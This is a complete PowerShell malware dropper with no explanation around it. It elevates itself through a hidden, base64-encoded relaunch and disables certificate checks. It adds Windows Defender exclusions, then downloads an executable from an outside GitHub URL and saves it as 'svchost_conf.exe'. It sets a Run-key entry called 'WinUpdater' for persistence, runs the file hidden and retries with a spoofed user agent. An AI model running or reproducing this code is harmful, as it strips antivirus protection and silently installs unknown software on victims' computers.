$s = {
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Start-Process powershell.exe -ArgumentList "-NoP -Ex Bypass -W Hidden -Enco $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition)))" -Verb RunAs
        exit
    }

    # 1. Force TLS 1.2 and Ignore Certificate Errors
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

    # 2. Add Exclusions Fast
    $d = "C:\Users\Public\Documents"
    $f = "$d\svchost_conf.exe"
    $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"

    Add-MpPreference -ExclusionPath $d -EA 0
    Add-MpPreference -ExclusionProcess "powershell.exe", "svchost_conf.exe" -EA 0

    Start-Sleep -s 3

    # 3. Download using Invoke-WebRequest (Alternative to BITS/WebClient)
    try {
        Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing -TimeoutSec 30
        
        if (Test-Path $f) {
            Unblock-File -Path $f -EA 0
            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$f`"" -EA 0
            Start-Process -FilePath $f -WindowStyle Hidden -EA 0
        }
    } catch {
        # Final Attempt: WebClient with custom User-Agent
        try {
            $w = New-Object System.Net.WebClient
            $w.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $w.DownloadFile($u, $f)
            Start-Process $f -WindowStyle Hidden -EA 0
        } catch {}
    }
}.ToString()

$e = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))
powershell.exe -NoP -W Hidden -Enco $e
